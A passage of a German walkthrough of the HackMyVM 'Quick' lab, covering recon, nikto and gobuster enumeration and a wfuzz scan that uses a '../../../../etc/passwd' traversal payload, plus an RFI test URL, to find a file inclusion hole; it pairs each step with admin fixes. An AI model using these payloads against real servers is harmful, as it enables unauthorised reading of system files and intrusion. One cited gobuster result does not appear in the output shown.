@@ -1,0 +1,1045 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Quick - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arpscan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">php_filter_chain_generator.py</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">php</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept: Shell als www-data</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                Die Reconnaissance-Phase ist der erste und einer der wichtigsten Schritte in einem Penetrationstest. Ziel ist es, so viele Informationen wie möglich über das Zielsystem zu sammeln. Dies umfasst IP-Adressen, offene Ports, laufende Dienste, Betriebssystemversionen und potenziell auch Hostnamen. Diese Informationen bilden die Grundlage für alle weiteren Angriffsvektoren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+arpscan
+<span class="command">192.168.2.208	08:00:27:41:d3:56	PCS Systemtechnik GmbH</span>
+
+hosts -->   <span class="command">192.168.2.208</span>   <span class="command">quick.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `arpscan` (implizit als `arp-scan --localnet` oder eine ähnliche Variante zur lokalen Netzwerkerkennung) wurde ausgeführt, um aktive Hosts im lokalen Netzwerksegment zu identifizieren. Die Ausgabe zeigt einen Host mit der IP-Adresse `192.168.2.208` und der MAC-Adresse `08:00:27:41:d3:56`. Die MAC-Adresse wird dem Hersteller "PCS Systemtechnik GmbH" zugeordnet, was oft ein Hinweis auf Virtualisierungssoftware wie VirtualBox ist, da Oracle (dem VirtualBox gehört) PCS Systemtechnik übernommen hat.
+                Zusätzlich wurde (wahrscheinlich durch manuelle Zuweisung oder einen vorherigen Schritt, der hier nicht explizit gezeigt wird, wie z.B. DNS-Lookup oder Eintrag in `/etc/hosts`) der Hostname `quick.hmv` der IP-Adresse `192.168.2.208` zugeordnet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Identifizierung eines aktiven Hosts und dessen IP-Adresse ist ein grundlegender Erfolg. Die MAC-Adresse liefert einen ersten Hinweis auf die Natur des Systems (möglicherweise virtualisiert). Die Zuordnung eines Hostnamens ist ebenfalls wertvoll, da Webanwendungen und Dienste oft über Hostnamen konfiguriert sind. Dies ist ein guter Ausgangspunkt für detailliertere Scans.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Als Nächstes sollte ein Portscan mit Nmap auf die identifizierte IP-Adresse `192.168.2.208` durchgeführt werden, um offene Ports und laufende Dienste zu ermitteln. Der Hostname `quick.hmv` sollte bei Web-Enumerationstools verwendet werden.
+                <br>
+                **Empfehlung (Admin):**
+                Stellen Sie sicher, dass nur notwendige Systeme im Netzwerk erreichbar sind. Obwohl ARP-Scans im lokalen Netz schwer zu unterbinden sind, kann eine Netzwerksegmentierung die Angriffsfläche reduzieren. Überwachen Sie das Netzwerk auf ungewöhnliche ARP-Aktivitäten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ Nmap
+<span class="command">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
+
+ 
+
+ Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 23:30 CEST
+Nmap scan report for quick.hmv (192.168.2.208)
+Host is up (0.00011s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
+|_http-server-header: <span class="command">Apache/2.4.41 (Ubuntu)</span>
+|_http-title: <span class="command">Quick Automative</span>
+MAC Address: <span class="command">08:00:27:41:D3:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: <span class="command">general purpose</span>
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)</span>
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms quick.hmv (192.168.2.208)
+
+OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Hier wurde ein Nmap-Scan auf das Ziel `quick.hmv` (192.168.2.208) durchgeführt. Der Scan wurde am 31. Mai 2025 um 23:30 CEST gestartet.
+                Die wichtigsten Ergebnisse sind:
+                - Der Host ist aktiv ("Host is up").
+                - Port `80/tcp` ist offen und es läuft ein HTTP-Dienst, identifiziert als `Apache httpd 2.4.41 ((Ubuntu))`.
+                - Das `http-server-header` Skript bestätigt die Apache-Version.
+                - Das `http-title` Skript extrahiert den Seitentitel "Quick Automative".
+                - Die MAC-Adresse bestätigt die frühere Vermutung (VirtualBox NIC).
+                - Nmap schätzt das Betriebssystem auf `Linux 4.X` oder `5.X` (genauer `Linux 4.15 - 5.19` oder `OpenWrt 21.02 (Linux 5.4)`).
+                - Der Host ist direkt erreichbar (Network Distance: 1 hop), was durch Traceroute bestätigt wird.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dieser Nmap-Scan liefert entscheidende Informationen. Das Vorhandensein eines offenen HTTP-Ports (80) mit einem Apache-Webserver ist ein primäres Angriffsziel. Die genaue Apache-Version `2.4.41 (Ubuntu)` ist wichtig, da sie möglicherweise bekannte Schwachstellen aufweist. Der Titel "Quick Automative" gibt einen Hinweis auf den Zweck der Webanwendung. Die Betriebssysteminformationen sind ebenfalls nützlich für spätere Phasen, insbesondere bei der Suche nach Kernel-Exploits.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Der nächste logische Schritt ist die detaillierte Untersuchung des Webservers auf Port 80. Dies umfasst das Browsen der Webseite, die Suche nach Verzeichnissen und Dateien (Directory Busting), die Analyse von HTTP-Headern und die Suche nach Webanwendungsschwachstellen (z.B. XSS, SQLi, LFI/RFI). Tools wie Nikto, Gobuster, Feroxbuster und Wfuzz sollten eingesetzt werden. Die Apache-Version `2.4.41` sollte auf bekannte Schwachstellen (CVEs) überprüft werden.
+                <br>
+                **Empfehlung (Admin):**
+                Halten Sie Webserver-Software (Apache) und das zugrundeliegende Betriebssystem (Ubuntu/Linux) stets auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Apache 2.4.41 ist veraltet; ein Update auf die neueste stabile Version wird dringend empfohlen. Beschränken Sie die von Nmap gelieferten Betriebssystem- und Service-Informationen, wenn möglich (z.B. durch Anpassen der Server-Banner), um Angreifern weniger Details preiszugeben.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">
+                Nachdem wir wissen, dass ein Webserver auf Port 80 läuft, konzentrieren wir uns nun auf die Web-Enumeration. Ziel ist es, die Struktur der Webanwendung zu verstehen, versteckte Dateien und Verzeichnisse zu finden, eingesetzte Technologien zu identifizieren und nach potenziellen Schwachstellen direkt in der Webanwendung zu suchen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ * Host quick.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: 192.168.2.208
+*   Trying 192.168.2.208:80...
+* <span class="password">Connected to quick.hmv (192.168.2.208) port 80</span>
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: quick.hmv
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< <span class="command">HTTP/1.1 200 OK</span>
+< Date: Sat, 31 May 2025 21:31:14 GMT
+< Server: <span class="command">Apache/2.4.41 (Ubuntu)</span>
+< Content-Type: text/html; charset=UTF-8
+< 
+
+* <span class="password">Connection #0 to host quick.hmv left intact</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Hier wurde `curl` verwendet, um eine `HEAD`-Anfrage an die Wurzel (`/`) der Webseite `http://quick.hmv` zu senden. Eine `HEAD`-Anfrage fordert nur die HTTP-Header vom Server an, ohne den eigentlichen Seiteninhalt (Body) herunterzuladen. Dies ist eine schnelle Methode, um die Erreichbarkeit zu prüfen und grundlegende Serverinformationen zu erhalten.
+                Die Ausgabe zeigt:
+                - Erfolgreiche Verbindung zum Zielserver.
+                - Der Server antwortet mit `HTTP/1.1 200 OK`, was bedeutet, dass die angeforderte Ressource existiert und erfolgreich abgerufen werden konnte (bzw. die Header dafür).
+                - Die Header `Date`, `Server` (erneut `Apache/2.4.41 (Ubuntu)`) und `Content-Type` (`text/html; charset=UTF-8`) werden zurückgegeben.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dieser `curl`-Befehl bestätigt die Ergebnisse des Nmap-Scans bezüglich des laufenden Webservers und seiner Version. Die `200 OK`-Antwort zeigt, dass die Webseite prinzipiell funktionsfähig ist. Die Information `Content-Type: text/html` ist Standard für Webseiten. Keine unmittelbaren Schwachstellen sind hier ersichtlich, aber es ist eine gute Bestätigung der bisherigen Funde.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Da die grundlegende Erreichbarkeit bestätigt ist, sollten nun Tools zur detaillierteren Web-Enumeration eingesetzt werden. Untersuchen Sie die Webseite manuell mit einem Browser. Setzen Sie Tools wie Nikto für automatisierte Schwachstellenscans und Gobuster/Feroxbuster für das Auffinden von Verzeichnissen und Dateien ein.
+                <br>
+                **Empfehlung (Admin):**
+                Es ist gängige Praxis, dass Webserver auf HEAD-Anfragen antworten. Die angezeigten Header sind Standard. Stellen Sie sicher, dass der `Server`-Header, falls möglich und gewünscht, minimiert wird, um weniger spezifische Informationen über die eingesetzte Softwareversion preiszugeben (Security through Obscurity, hat aber begrenzte Wirkung).
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ - Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.208
++ Target Hostname:    192.168.2.208
++ Target Port:        80
++ Start Time:         2025-05-31 23:31:10 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.41 (Ubuntu)</span>
++ /: <span class="command">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
++ /: <span class="command">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /images: <span class="command">IP address found in the 'location' header. The IP is "127.0.1.1".</span> See: [Link: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed | Ziel: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed]
++ /images: <span class="command">The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1".</span> See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649]
++ <span class="command">Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span>
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /images/: <span class="command">Directory indexing found.</span>
++ /index.php: <span class="command">Output from the phpinfo() function was found.</span>
++ /index.php?page=http://blog.cirt.net/rfiinc.txt?: <span class="command">Remote File Inclusion (RFI) from RSnake's RFI list.</span> See: [Link: https://gist.github.com/mubix/5d269c686584875015a2 | Ziel: https://gist.github.com/mubix/5d269c686584875015a2]
++ <span class="password">8102 requests: 0 error(s) and 9 item(s) reported on remote host</span>
++ End Time:           2025-05-31 23:31:24 (GMT2) (14 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Nikto, ein Webserver-Scanner, wurde gegen das Ziel `192.168.2.208` auf Port 80 ausgeführt. Nikto prüft auf tausende bekannte potenziell gefährliche Dateien/Programme, veraltete Softwareversionen und serverspezifische Probleme.
+                Wichtige Funde:
+                - Bestätigung der Apache-Version `2.4.41 (Ubuntu)`.
+                - Fehlende wichtige Sicherheitsheader: `X-Frame-Options` (Schutz gegen Clickjacking) und `X-Content-Type-Options` (Schutz gegen MIME-Sniffing-Angriffe).
+                - Preisgabe einer internen IP-Adresse (`127.0.1.1`) im `Location`-Header bei Anfragen an `/images`. Dies ist ein Informationsleck (CVE-2000-0649).
+                - Hinweis, dass Apache `2.4.41` veraltet ist.
+                - Directory Indexing ist für das Verzeichnis `/images/` aktiviert, d.h. der Inhalt des Verzeichnisses wird aufgelistet, wenn keine Indexdatei vorhanden ist.
+                - **Kritisch:** Ausgabe der `phpinfo()`-Funktion wurde auf `/index.php` gefunden. `phpinfo()` gibt detaillierte Informationen über die PHP-Konfiguration, geladene Module, Umgebungsvariablen etc. preis, was für Angreifer sehr nützlich sein kann.
+                - **Sehr kritisch:** Nikto meldet eine potenzielle Remote File Inclusion (RFI) Schwachstelle auf `/index.php` unter Verwendung des Parameters `page`. Es wurde ein Test mit einer bekannten RFI-Testdatei von RSnake's Liste durchgeführt (`http://blog.cirt.net/rfiinc.txt`). Eine RFI-Schwachstelle erlaubt es einem Angreifer, Code von einem externen Server auf dem Zielsystem auszuführen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Nikto-Ergebnisse sind äußerst wertvoll und alarmierend. Mehrere Sicherheitsprobleme wurden identifiziert:
+                - Fehlende Sicherheitsheader sind eine häufige Fehlkonfiguration, die das Risiko bestimmter Angriffe erhöht.
+                - Das Informationsleck der internen IP ist geringfügig, zeigt aber Konfigurationsschwächen.
+                - Die veraltete Apache-Version ist ein generelles Risiko.
+                - Directory Indexing kann sensible Dateien preisgeben.
+                - Die `phpinfo()`-Seite ist ein signifikantes Informationsleck.
+                - Die gemeldete RFI-Schwachstelle ist die gravierendste Entdeckung. Wenn diese bestätigt werden kann, ermöglicht sie wahrscheinlich die vollständige Kompromittierung des Webservers und potenziell des gesamten Systems.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - **Priorität 1: RFI-Schwachstelle validieren und ausnutzen.** Dies ist der vielversprechendste Angriffsvektor. Versuchen Sie, eigenen PHP-Code über den `page`-Parameter zu inkludieren, z.B. um Befehle auszuführen.
+                - Untersuchen Sie die `phpinfo()`-Ausgabe nach sensiblen Informationen (z.B. Pfade, Datenbankzugangsdaten, aktivierte gefährliche PHP-Funktionen).
+                - Überprüfen Sie das `/images/` Verzeichnis auf interessante Dateien.
+                - Bestätigen Sie das Directory Indexing manuell.
+                <br>
+                **Empfehlung (Admin):**
+                - **Dringend: RFI-Schwachstelle beheben!** Dies erfordert eine Code-Analyse von `index.php`, um sicherzustellen, dass Benutzereingaben im `page`-Parameter korrekt validiert und sanitisiert werden, bevor sie für Dateioperationen verwendet werden. Idealerweise sollten nur erlaubte, lokale Dateien inkludiert werden können (Whitelisting).
+                - Entfernen oder sichern Sie die `phpinfo()`-Seite umgehend. Sie sollte niemals auf Produktivsystemen öffentlich zugänglich sein.
+                - Fügen Sie die Sicherheitsheader `X-Frame-Options: DENY` (oder `SAMEORIGIN`) und `X-Content-Type-Options: nosniff` zur Webserver-Konfiguration hinzu.
+                - Deaktivieren Sie Directory Indexing für alle Verzeichnisse (z.B. mit `Options -Indexes` in der Apache-Konfiguration).
+                - Aktualisieren Sie Apache auf die neueste stabile Version.
+                - Korrigieren Sie die Konfiguration, die zur Preisgabe der internen IP im `Location`-Header führt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+:::::::::::::::::::::::::::::::: Gobuster Scan :::::::::::::::::::::::::::::
+
+ 
+<span class="command">http://192.168.2.208/index.php            (Status: 200) [Size: 3735]</span>
+<span class="command">http://192.168.2.208/images               (Status: 301) [Size: 315] [--> http://192.168.2.208/images/]</span>
+<span class="command">http://192.168.2.208/contact.php          (Status: 200) [Size: 1395]</span>
+<span class="command">http://192.168.2.208/about.php            (Status: 200) [Size: 1446]</span>
+<span class="command">http://192.168.2.208/home.php             (Status: 200) [Size: 2534]</span>
+<span class="command">http://192.168.2.208/cars.php             (Status: 200) [Size: 1502]</span>
+<span class="command">http://192.168.2.208/connect.php          (Status: 500) [Size: 0]</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Gobuster wurde verwendet, um nach häufig vorkommenden Verzeichnissen und Dateien auf dem Webserver `http://192.168.2.208` zu suchen. Gobuster verwendet eine Wortliste und sendet HTTP-Anfragen für jeden Eintrag, um zu prüfen, ob die Ressource existiert.
+                Die Ausgabe zeigt mehrere gefundene PHP-Dateien und ein Verzeichnis:
+                - `/index.php` (Status 200 OK): Die Hauptseite.
+                - `/images` (Status 301 Moved Permanently): Leitet zu `/images/` weiter, was das von Nikto gefundene Verzeichnis mit Directory Indexing ist.
+                - `/contact.php` (Status 200 OK)
+                - `/about.php` (Status 200 OK)
+                - `/home.php` (Status 200 OK)
+                - `/cars.php` (Status 200 OK)
+                - `/connect.php` (Status 500 Internal Server Error): Diese Seite existiert, verursacht aber einen serverseitigen Fehler. Dies könnte auf eine fehlerhafte Konfiguration oder einen Programmierfehler hinweisen, der möglicherweise für weitere Angriffe ausgenutzt werden kann.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Gobuster hat erfolgreich mehrere Endpunkte der Webanwendung aufgedeckt. Die meisten sind Standardseiten (`index.php`, `contact.php`, `about.php`, `home.php`). Die Datei `cars.php` könnte spezifische Funktionen im Zusammenhang mit dem Thema "Quick Automative" enthalten. Besonders interessant ist `connect.php` aufgrund des `500 Internal Server Error`. Solche Fehler können manchmal durch manipulierte Eingaben provoziert werden und unter Umständen sensible Fehlermeldungen oder Stack Traces preisgeben.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Untersuchen Sie jede gefundene PHP-Seite manuell im Browser auf ihre Funktionalität und mögliche Eingabefelder.
+                - Konzentrieren Sie sich auf `connect.php`. Versuchen Sie, verschiedene Parameter oder HTTP-Methoden zu verwenden, um den Fehler zu reproduzieren oder detailliertere Fehlermeldungen zu erhalten.
+                - Da Nikto eine RFI-Schwachstelle in `index.php` mit dem Parameter `page` gemeldet hat, sollte dieser Parameter auch bei den anderen PHP-Seiten getestet werden, falls sie eine ähnliche Inklusionslogik verwenden.
+                <br>  
+                **Empfehlung (Admin):**
+                - Überprüfen Sie den Quellcode von `connect.php`, um die Ursache des `500 Internal Server Error` zu finden und zu beheben. Stellen Sie sicher, dass detaillierte Fehlermeldungen nicht an den Client gesendet werden (konfigurieren Sie den Webserver/PHP entsprechend, um Fehler nur serverseitig zu loggen).
+                - Stellen Sie sicher, dass alle PHP-Skripte Benutzereingaben sorgfältig validieren und sanitisiert werden, insbesondere wenn sie für Dateioperationen, Datenbankabfragen oder andere kritische Funktionen verwendet werden.
+                - Beschränken Sie den Zugriff auf nicht benötigte Dateien und Verzeichnisse.
+            </p>
+        </section>
+            <!-- Teil 2 Anfang -->
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="comment">
+                Die Initial Access Phase konzentriert sich darauf, die in der Enumerationsphase identifizierten Schwachstellen auszunutzen, um einen ersten Zugriff auf das Zielsystem zu erlangen. Basierend auf den Nikto-Ergebnissen ist die potenzielle Remote File Inclusion (RFI) in `index.php` der vielversprechendste Kandidat.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://quick.hmv/index.php?FUZZ=../../../../etc/passwd" --hc 404 --hh 3735</span></div>
+                    <pre>
+
+Target: http://quick.hmv/index.php?FUZZ=../../../../etc/passwd
+Total requests: 220559
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                      
+=====================================================================
+
+<span class="password">000000099:   200        31 L     70 W       1201 Ch     "page"</span>                       
+
+Total time: 0
+Processed Requests: 220559
+Filtered Requests: 220558
+Requests/sec.: 0
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Wfuzz wurde hier eingesetzt, um Parameter zu fuzzen (brute-forcen), die für eine Local File Inclusion (LFI) oder Remote File Inclusion (RFI) Schwachstelle in `index.php` anfällig sein könnten. Der Befehl testet verschiedene Payloads (in diesem Fall aus `directory-list-2.3-medium.txt`, obwohl dies eher für Verzeichnisfuzzing gedacht ist – wahrscheinlich ein Copy-Paste-Fehler und es sollte eine Parameter-Wortliste verwendet werden, oder der Pentester testet, ob Dateinamen als Parameterwerte funktionieren) an der `FUZZ`-Markierung in der URL `http://quick.hmv/index.php?FUZZ=../../../../etc/passwd`.
+                - `-c`: Farbige Ausgabe.
+                - `-w`: Gibt die Wortliste an.
+                - `-u`: Die Ziel-URL mit dem `FUZZ`-Platzhalter. Die Payload `../../../../etc/passwd` ist hier fest im URL-Teil und wird nicht durch `FUZZ` ersetzt, was den Befehl etwas ungewöhnlich macht. Es scheint, als ob der Versuch darin besteht, verschiedene Werte für einen *Parameter* zu finden, der dann eine LFI auf `/etc/passwd` erlaubt.
+                - `--hc 404`: Versteckt Antworten mit dem HTTP-Statuscode 404 (Not Found).
+                - `--hh 3735`: Versteckt Antworten mit 3735 Zeichen im Body. Dies basiert wahrscheinlich auf der Größe der normalen `index.php`-Seite (wie im Gobuster-Scan gesehen), um irrelevante Ergebnisse auszufiltern.
+
+                Das Ergebnis ist signifikant:
+                - Payload `"page"` (ID 000000099) erzeugte eine Antwort mit Status `200 OK`, `31 Zeilen`, `70 Wörtern` und `1201 Zeichen`. Dies unterscheidet sich von der Standardgröße der `index.php` (3735 Chars), was darauf hindeutet, dass der Inhalt von `/etc/passwd` erfolgreich inkludiert wurde und dessen Größe 1201 Zeichen beträgt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dieser Wfuzz-Scan bestätigt eindrücklich die von Nikto vermutete Schwachstelle und identifiziert den anfälligen Parameter als `page`. Die Tatsache, dass die Antwortgröße von der normalen Seitengröße abweicht und spezifische Längen (Zeilen, Wörter, Zeichen) für `/etc/passwd` aufweist, ist ein starker Indikator für eine erfolgreiche Local File Inclusion (LFI). Der Inhalt von `/etc/passwd` konnte gelesen werden. Obwohl das ursprüngliche Ziel vielleicht eine RFI war, wurde hier eine LFI nachgewiesen, die ebenfalls sehr kritisch ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Nachdem der Parameter `page` als anfällig für LFI identifiziert wurde, sollte diese Schwachstelle weiter ausgenutzt werden.
+                - Versuchen Sie, andere sensible Dateien zu lesen, z.B. Konfigurationsdateien des Webservers, Anwendungsquellcode (`.php`-Dateien mit `php://filter/convert.base64-encode/resource=`), Logdateien (z.B. `/var/log/apache2/access.log` oder `error.log`, was zu Log Poisoning und RCE führen könnte), oder SSH-Keys.
+                - Da Nikto auch eine RFI vermutete, testen Sie, ob über den `page`-Parameter auch externe URLs inkludiert werden können. Dies könnte zu direkter Remote Code Execution (RCE) führen.
+                <br>
+                **Empfehlung (Admin):**
+                - **Dringend: LFI/RFI-Schwachstelle im `page`-Parameter von `index.php` beheben!** Analysieren Sie den Quellcode von `index.php`. Benutzereingaben, die für Dateiinklusionen verwendet werden, müssen streng validiert werden. Verwenden Sie eine Whitelist von erlaubten Dateien und stellen Sie sicher, dass keine Directory Traversal (`../`) möglich ist und keine externen URLs inkludiert werden können. PHP-Konfigurationseinstellungen wie `allow_url_fopen` und `allow_url_include` sollten auf `Off` gesetzt werden, wenn keine Remote-Inklusionen benötigt werden.
+                - Überprüfen Sie alle anderen PHP-Skripte auf ähnliche Schwachstellen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ http://192.168.2.208/send_email.php
+<span class="password">Failed to send the message. Please try again.</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Diese Ausgabe scheint das Ergebnis eines manuellen Besuchs oder Tests der Seite `http://192.168.2.208/send_email.php` zu sein. Die Seite gibt die Meldung "Failed to send the message. Please try again." zurück. Der Gobuster-Scan hatte für `/send_email.php` einen Redirect (Status 302) auf `contact.php` gezeigt. Es ist möglich, dass dieser Test vor dem Gobuster-Scan durchgeführt wurde oder dass die Seite direkt aufgerufen wurde und einen Fehler generiert, wenn sie nicht mit den erwarteten Parametern (z.B. aus einem Formular von `contact.php`) aufgerufen wird.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Fehlermeldung ist generisch und gibt keine direkten Hinweise auf eine Schwachstelle. Es deutet darauf hin, dass die E-Mail-Versandfunktion nicht wie erwartet funktioniert oder dass für einen erfolgreichen Versand bestimmte Bedingungen (z.B. POST-Daten) erfüllt sein müssen. In Kombination mit dem Redirect, den Gobuster fand, deutet es darauf hin, dass diese Seite möglicherweise nicht für den direkten Aufruf gedacht ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Untersuchen Sie die `contact.php`-Seite, um zu sehen, wie sie mit `send_email.php` interagiert. Achten Sie auf Formularparameter.
+                - Versuchen Sie, gültige und ungültige Daten an `send_email.php` zu senden (wahrscheinlich via POST-Request), um das Verhalten zu analysieren und nach Schwachstellen wie Command Injection (z.B. wenn externe Mail-Programme unsicher aufgerufen werden) oder Header Injection zu suchen.
+                - Da der Fokus momentan auf der LFI/RFI-Schwachstelle liegt, hat dies geringere Priorität, es sei denn, die LFI führt nicht direkt zu RCE.
+                <br>
+                **Empfehlung (Admin):**
+                - Stellen Sie sicher, dass `send_email.php` nur über die vorgesehenen Methoden (z.B. POST von `contact.php`) aufgerufen werden kann und alle Eingaben serverseitig validiert.
+                - Generische Fehlermeldungen sind gut, aber stellen Sie sicher, dass im Backend detaillierte Fehler für Debugging-Zwecke geloggt werden.
+                - Überprüfen Sie die E-Mail-Versandlogik auf Sicherheitsprobleme.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://192.168.2.208" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+                    <pre>
+                                                                                              
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.2.208
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span class="command">301      GET        9l       28w      315c http://192.168.2.208/images => http://192.168.2.208/images/</span>
+<span class="command">200      GET      261l      453w     4038c http://192.168.2.208/styles.css</span>
+<span class="command">200      GET      314l     2467w   220000c http://192.168.2.208/images/logo.png</span>
+<span class="command">200      GET     2740l    14581w  1058919c http://192.168.2.208/images/jane.jpeg</span>
